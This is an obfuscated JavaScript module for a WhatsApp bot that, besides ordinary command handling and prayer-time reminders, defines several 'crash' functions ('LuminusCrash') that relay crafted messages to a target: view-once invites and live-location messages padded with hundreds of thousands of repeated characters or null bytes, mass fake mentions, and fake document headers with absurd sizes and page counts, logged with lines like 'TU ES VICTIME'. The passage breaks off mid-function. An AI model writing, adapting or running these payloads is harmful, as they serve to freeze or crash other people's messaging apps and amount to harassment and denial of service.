const _0x2c1761 = function () {
  let _0x1d3869 = true;
  return function (_0x4ed14c, _0x37c722) {
    const _0x9e22f2 = _0x1d3869 ? function () {
      if (_0x37c722) {
        const _0x1f9d50 = _0x37c722.apply(_0x4ed14c, arguments);
        _0x37c722 = null;
        return _0x1f9d50;
      }
    } : function () {};
    _0x1d3869 = false;
    return _0x9e22f2;
  };
}();
const _0x21b944 = _0x2c1761(this, function () {
  let _0x436eda;
  try {
    const _0x398e2c = Function("return (function() {}.constructor(\"return this\")( ));");
    _0x436eda = _0x398e2c();
  } catch (_0x3443ae) {
    _0x436eda = window;
  }
  const _0x2b0945 = _0x436eda.console = _0x436eda.console || {};
  const _0x5dbf3b = ["log", "warn", "info", "error", "exception", "table", "trace"];
  for (let _0x269ed4 = 0x0; _0x269ed4 < _0x5dbf3b.length; _0x269ed4++) {
    const _0x5b8dfc = _0x2c1761.constructor.prototype.bind(_0x2c1761);
    const _0x25e29a = _0x5dbf3b[_0x269ed4];
    const _0x37d716 = _0x2b0945[_0x25e29a] || _0x5b8dfc;
    _0x5b8dfc.__proto__ = _0x2c1761.bind(_0x2c1761);
    _0x5b8dfc.toString = _0x37d716.toString.bind(_0x37d716);
    _0x2b0945[_0x25e29a] = _0x5b8dfc;
  }
});
_0x21b944();
module.exports = async (_0x4d73c7, _0x22c6f2, _0x5c5c5d) => {
  try {
    const _0x756c19 = _0x22c6f2.mtype === "conversation" ? _0x22c6f2.message.conversation : _0x22c6f2.mtype == "imageMessage" ? _0x22c6f2.message.imageMessage.caption : _0x22c6f2.mtype == "videoMessage" ? _0x22c6f2.message.videoMessage.caption : _0x22c6f2.mtype == "extendedTextMessage" ? _0x22c6f2.message.extendedTextMessage.text : _0x22c6f2.mtype == "buttonsResponseMessage" ? _0x22c6f2.message.buttonsResponseMessage.selectedButtonId : _0x22c6f2.mtype == "listResponseMessage" ? _0x22c6f2.message.listResponseMessage.singleSelectReply.selectedRowId : _0x22c6f2.mtype === "interactiveResponseMessage" ? JSON.parse(_0x22c6f2.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x22c6f2.mtype == "templateButtonReplyMessage" ? _0x22c6f2.message.templateButtonReplyMessage.selectedId : _0x22c6f2.mtype === "messageContextInfo" ? _0x22c6f2.message.buttonsResponseMessage?.["selectedButtonId"] || _0x22c6f2.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x22c6f2.text : '';
    const _0x54c5ce = typeof _0x22c6f2.text == "string" ? _0x22c6f2.text : '';
    const _0x232cc0 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(_0x756c19) ? _0x756c19.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
    const _0x1c5e20 = _0x756c19.startsWith(_0x232cc0);
    const _0x17f353 = _0x756c19.replace(_0x232cc0, '').trim().split(/ +/).shift().toLowerCase();
    const _0x42c489 = _0x232cc0 + _0x17f353;
    const _0xa2f393 = _0x756c19.trim().split(/ +/).slice(0x1);
    const _0x5c1f4c = _0x22c6f2.quoted ? _0x22c6f2.quoted : _0x22c6f2;
    const _0x42cee0 = _0x22c6f2.key.remoteJid;
    const _0x29c4eb = (_0x5c1f4c.msg || _0x5c1f4c).mimetype || '';
    const _0xd0eb9a = q = _0xa2f393.join(" ");
    const _0x42731e = await _0x4d73c7.decodeJid(_0x4d73c7.user.id);
    const _0x41425e = _0x22c6f2.sender == owner + "@s.whatsapp.net" ? true : !!(_0x22c6f2.sender == _0x42731e);
    const _0x4fe88d = _0x22c6f2.chat.endsWith("@g.us");
    const _0x46db1a = _0x22c6f2.sender.split('@')[0x0];
    const _0x2fcd41 = _0x22c6f2.pushName || '' + _0x46db1a;
    const _0x88eb25 = _0x4fe88d ? await _0x4d73c7.groupMetadata(_0x22c6f2.chat) : {};
    let _0x4e9199 = _0x4fe88d ? _0x88eb25.participants.find(_0x5d2fb5 => _0x5d2fb5.id == _0x42731e) : {};
    let _0x425076 = _0x4fe88d ? _0x88eb25.participants.find(_0x5c6305 => _0x5c6305.id == _0x22c6f2.sender) : {};
    const _0xc42364 = !!(_0x4e9199?.["admin"] !== null);
    const _0x48f380 = !!(_0x425076?.["admin"] !== null);
    const {
      runtime: _0x87124a,
      getRandom: _0x45ca55,
      getTime: _0x4cd047,
      tanggal: _0x228092,
      toRupiah: _0x120223,
      telegraPh: _0x435126,
      pinterest: _0xa71a42,
      ucapan: _0x555c13,
      generateProfilePicture: _0x9e0e0a,
      getBuffer: _0xfcc587,
      fetchJson: _0x46a635
    } = require("./all/function.js");
    const {
      toAudio: _0x1aa9e6,
      toPTT: _0x3aebdd,
      toVideo: _0x36c57a,
      ffmpeg: _0x16376e
    } = require("./all/converter.js");
    const _0x30b9ea = JSON.parse(fs.readFileSync("./all/database/idgrup.json").toString());
    const _0x32b479 = JSON.parse(fs.readFileSync("./all/database/premium.json"));
    const _0x3f886c = JSON.parse(fs.readFileSync("./all/database/owner.json"));
    const _0xf08ce7 = [_0x42731e, ..._0x3f886c, ...global.owner].map(_0x4f7c48 => _0x4f7c48.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x22c6f2.sender);
    const _0x37dcc3 = _0x32b479.includes(_0x22c6f2.sender);
    global.mess = {
      'done': "𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗘 𝗘𝗫𝗘𝗖𝗨𝗧𝗘𝗥🍃\n\n𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 𝚃𝙷𝙴 𝙶𝙾𝙳 𝙻𝙸𝙼𝚄𝙻𝙴💰",
      'sendbug': "`𝗜𝗠 𝗔𝗧𝗢𝗠𝗜𝗖`☠️🧪\n\n𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 𝚃𝙷𝙴 𝙶𝙾𝙳 𝙻𝙸𝙼𝚄𝙻𝙴💰"
    };
    if (_0x1c5e20) {
      console.log(chalk.yellow.bgCyan.bold(namabot), color("[ 𝑙𝑖𝑚𝑢𝑙𝑒 ℎ𝑖𝑛𝑢𝑔𝑒𝑟𝑎 ]", 'red'), color("FROM", "red"), color('' + _0x46db1a, "red"), color("Text :", 'red'), color('' + _0x42c489, "white"));
    }
    let _0x315b9d;
    try {
      _0x315b9d = await _0x4d73c7.profilePictureUrl(_0x22c6f2.sender, 'image');
    } catch (_0x3187e3) {
      _0x315b9d = "https://files.catbox.moe/giab52.jpeg";
    }
    const _0x140c07 = {
      'key': {
        'remoteJid': "status@broadcast",
        'fromMe': false,
        'participant': "0@s.whatsapp.net"
      },
      'message': {
        'newsletterAdminInviteMessage': {
          'newsletterJid': "120363374529648284@newsletter",
          'newsletterName': 'Hore',
          'jpegThumbnail': '',
          'caption': "Powered By " + namaowner,
          'inviteExpiration': Date.now() + 0x6c258c00
        }
      }
    };
    const _0x2be559 = {
      'key': {
        'participant': "0@s.whatsapp.net",
        'remoteJid': "status@broadcast",
        'fromMe': false,
        'id': "SALUT"
      },
      'message': {
        'locationMessage': {
          'name': "𝐂𝐑𝐀𝐙𝐘 𝐃𝐄𝐕🍃🕷️\nʟɪᴍᴜʟᴇ{ʰⁱⁿᵘᵍᵉʳᵃ}✔️ ",
          'jpegThumbnail': ''
        }
      }
    };
    _0x4d73c7.autoshalat = _0x4d73c7.autoshalat ? _0x4d73c7.autoshalat : {};
    let _0x156280 = _0x22c6f2.chat;
    if (_0x156280 in _0x4d73c7.autoshalat) {
      return false;
    }
    let _0x3a7049 = {
      'shubuh': "04:03",
      'terbit': '05:44',
      'dhuha': "06:02",
      'dzuhur': '11:39',
      'ashar': "15:03",
      'magrib': '17:52',
      'isya': "19:05"
    };
    const _0x28bd02 = new Date(new Date().toLocaleString("en-US", {
      'timeZone': "Asia/Jakarta"
    }));
    const _0xc9c24f = _0x28bd02.getHours();
    const _0x3cff58 = _0x28bd02.getMinutes();
    const _0xfc86d0 = _0xc9c24f.toString().padStart(0x2, '0') + ':' + _0x3cff58.toString().padStart(0x2, '0');
    for (let [_0x49f6d8, _0x144954] of Object.entries(_0x3a7049)) {
      if (_0xfc86d0 === _0x144954) {
        _0x4d73c7.autoshalat[_0x156280] = [_0x4d73c7.sendMessage(_0x22c6f2.chat, {
          'audio': {
            'url': "https://files.catbox.moe/nwc3ym.mp3"
          },
          'mimetype': "audio/mpeg",
          'ptt': true,
          'contextInfo': {
            'externalAdReply': {
              'showAdAttribution': true,
              'mediaType': 0x1,
              'mediaUrl': '',
              'title': "ʟɪᴍᴜʟᴇ{ʰⁱⁿᵘᵍᵉʳᵃ}✔️.",
              'body': "😋 " + _0x144954,
              'sourceUrl': "https://whatsapp.com/channel/0029VajjpHoGZNCsyVLRRk1f",
              'thumbnail': await fs.readFileSync("./all/crazy.jpg"),
              'renderLargerThumbnail': true
            }
          }
        }, {}), setTimeout(async () => {
          delete _0x4d73c7.autoshalat[_0x22c6f2.chat];
        }, 0xdea8)];
      }
    }
    async function _0x1ab039(_0x134aee) {
      _0x4d73c7.sendMessage(_0x22c6f2.chat, {
        'text': _0x134aee,
        'contextInfo': {
          'mentionedJid': [_0x22c6f2.sender],
          'externalAdReply': {
            'showAdAttribution': true,
            'isForwarded': true,
            'containsAutoReply': true,
            'title': "ʟɪᴍᴜʟᴇ{ʰⁱⁿᵘᵍᵉʳᵃ}✔️",
            'body': "💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠",
            'previewType': "VIDEO",
            'thumbnailUrl': "https://files.catbox.moe/giab52.jpeg",
            'thumbnail': '',
            'sourceUrl': "https://whatsapp.com/channel/0029VajBry5FnSzAqZxMhi1i"
          }
        }
      }, {
        'quoted': _0x22c6f2
      });
    }
    ;
    async function _0x589ed5(_0x387ed5) {
      let _0x3ba46b = "💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠" + 'ꦾ'.repeat(0xc350);
      let _0x36752a = Array.from({
        'length': 0x88b8
      }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net");
      var _0x3de560 = generateWAMessageFromContent(_0x387ed5, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'newsletterAdminInviteMessage': {
              'newsletterJid': "120363321780343299@newsletter",
              'newsletterName': _0x3ba46b,
              'jpegThumbnail': '',
              'caption': _0x3ba46b,
              'inviteExpiration': Date.now() + 0x6c258c00
            },
            'contextInfo': {
              'mentionedJid': _0x36752a,
              'groupMentions': [{
                'groupJid': "120363321780343299@newsletter",
                'groupSubject': _0x3ba46b
              }]
            }
          }
        }
      }), {
        'userJid': _0x387ed5
      });
      await _0x4d73c7.relayMessage(_0x387ed5, _0x3de560.message, {
        'participant': {
          'jid': _0x387ed5
        },
        'messageId': _0x3de560.key.id
      });
      console.log(chalk.red.bold("💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠"));
    }
    async function _0x298c08(_0x3eb047) {
      let _0x15a973 = generateWAMessageFromContent(_0x3eb047, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': "💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠",
              'degreesLongitude': "Hello bro, c'est moi 𝑙𝑖𝑚𝑢𝑙𝑒 ℎ𝑖𝑛𝑢𝑔𝑒𝑟𝑎",
              'caption': "𝕾𝕳𝕵𝕶𝕬 𝕯𝕰𝖁 🧪\0" + 'ꦾ'.repeat(0x15f90),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x3eb047,
        'quoted': _0x140c07
      });
      await _0x4d73c7.relayMessage(_0x3eb047, _0x15a973.message, {
        'participant': {
          'jid': _0x3eb047
        }
      });
      console.log(chalk.red.bold("T҉E҉C҉H҉ H҉I҉N҉U҉G҉E҉R҉A҉ 💀"));
    }
    async function _0x245065(_0x31cef4, _0x27a3eb, _0x419e16 = true) {
      await _0x4d73c7.relayMessage(_0x31cef4, {
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': "9999999999999",
                  'pageCount': 0x4e729fff,
                  'mediaKey': "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  'fileName': "Assalamu'alaikum",
                  'fileEncSha256': "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  'directPath': "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1726867151",
                  'contactVcard': true,
                  'jpegThumbnail': _0x27a3eb
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "T҉E҉C҉H҉ H҉I҉N҉U҉G҉E҉R҉A҉ 💀\n" + 'ꦾ'.repeat(0x30d40)
              },
              'nativeFlowMessage': {
                'messageParamsJson': '{}'
              },
              'contextInfo': {
                'mentionedJid': ["243890432038@s.whatsapp.net"],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'fromMe': false,
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'quotedMessage': {
                  'documentMessage': {
                    'url': "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    'fileLength': "9999999999999",
                    'pageCount': 0x4e729fff,
                    'mediaKey': "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    'fileName': "Pembantai Ripper",
                    'fileEncSha256': "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': "1724474503",
                    'contactVcard': true,
                    'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    'jpegThumbnail': ''
                  }
                }
              }
            }
          }
        }
      }, _0x419e16 ? {
        'participant': {
          'jid': _0x31cef4
        }
      } : {});
      console.log(chalk.magenta.bold("T҉E҉C҉H҉ H҉I҉N҉U҉G҉E҉R҉A҉ 💀"));
    }
    async function _0x143c98(_0x41e7a4) {
      _0x4d73c7.relayMessage(_0x41e7a4, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  'fileLength': "999999999",
                  'pageCount': 0x9184e729fff,
                  'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  'fileName': "ʟɪᴍᴜʟᴇ{ʰⁱⁿᵘᵍᵉʳᵃ}✔️",
                  'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  'directPath': "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1715880173",
                  'contactVcard': true
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "🔥⃟⃟⃟⃟⃚ ͢💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠𝄽⃟⃟⃟🔥" + 'ꦾ'.repeat(0x186a0) + '@1'.repeat(0x493e0)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': "1@newsletter",
                  'groupSubject': "RuzxxHere"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x41e7a4
        }
      });
      console.log(chalk.white.bold("TU ES VICTIME DE 𝑙𝑖𝑚𝑢𝑙𝑒 ℎ𝑖𝑛𝑢𝑔𝑒𝑟𝑎."));
    }
    async function _0xec0644(_0x599045) {
      await _0x4d73c7.relayMessage(_0x599045, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'locationMessage': {
                  'degreesLatitude': -999.035,
                  'degreesLongitude': 999.035
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "🔥⃟⃟⃟⃟⃚ ͢𝄽💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠𝄽⃟⃟⃟🔥" + 'ꦾ'.repeat(0x186a0) + '@1'.repeat(0x493e0)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': "1@newsletter",
                  'groupSubject': "BaraEXECUTE"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x599045
        }
      });
      console.log(chalk.red.bold("T҉E҉C҉H҉ H҉I҉N҉U҉G҉E҉R҉A҉ 💀"));
    }
    ;
    async function _0x676274(_0x27adb7, _0x3675ac = true) {
      await _0x4d73c7.relayMessage(_0x27adb7, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'locationMessage': {
                  'degreesLatitude': 0x0,
                  'degreesLongitude': 0x0
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠" + 'ꦾ'.repeat(0x30d40) + '@1'.repeat(0x249f0)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': "1@newsletter",
                  'groupSubject': " xCeZeT "
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x27adb7
        }
      }, {
        'messageId': null
      });
      console.log(chalk.yellow.bold("T҉E҉C҉H҉ H҉I҉N҉U҉G҉E҉R҉A҉ 💀"));
    }
    async function _0x585413(_0x2da997, _0x33d6a7 = true) {
      let _0x220bce = "T҉E҉C҉H҉ H҉I҉N҉U҉G҉E҉R҉A҉ 💀" + "\0".repeat(0x30d40);
      await _0x4d73c7.relayMessage(_0x2da997, {
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': "9999999999999",
                  'pageCount': 0x4e729fff,
                  'mediaKey': "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  'fileName': "ZynXzo New",
                  'fileEncSha256': "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  'directPath': "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1726867151",
                  'contactVcard': true,
                  'jpegThumbnail': "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z"
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': _0x220bce
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': ["0@s.whatsapp.net"],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'fromMe': false,
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'quotedMessage': {
                  'documentMessage': {
                    'url': "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    'fileLength': "9999999999999",
                    'pageCount': 0x4e729fff,
                    'mediaKey': "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    'fileName': "Bokep 18+",
                    'fileEncSha256': "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': "1724474503",
                    'contactVcard': true,
                    'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    'jpegThumbnail': "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z"
                  }
                }
              }
            }
          }
        }
      }, _0x33d6a7 ? {
        'participant': {
          'jid': _0x2da997
        }
      } : {
        'quoted': _0x22c6f2
      });
      console.log(chalk.green.bold("T҉E҉C҉H҉ H҉I҉N҉U҉G҉E҉R҉A҉ 💀"));
    }
    async function _0x18cafe(_0x410b00) {
      await _0x4d73c7.relayMessage(_0x410b00, {
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': "9999999999999",
                  'pageCount': 0x4e729fff,
                  'mediaKey': "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  'fileName': "\0",
                  'fileEncSha256': "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  'directPath': "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1726867151",
                  'contactVcard': true,
                  'jpegThumbnail': "https://i.top4top.io/p_32261nror0.jpg"
                },
                'hasMediaAttachment': true
              },
              'body': {
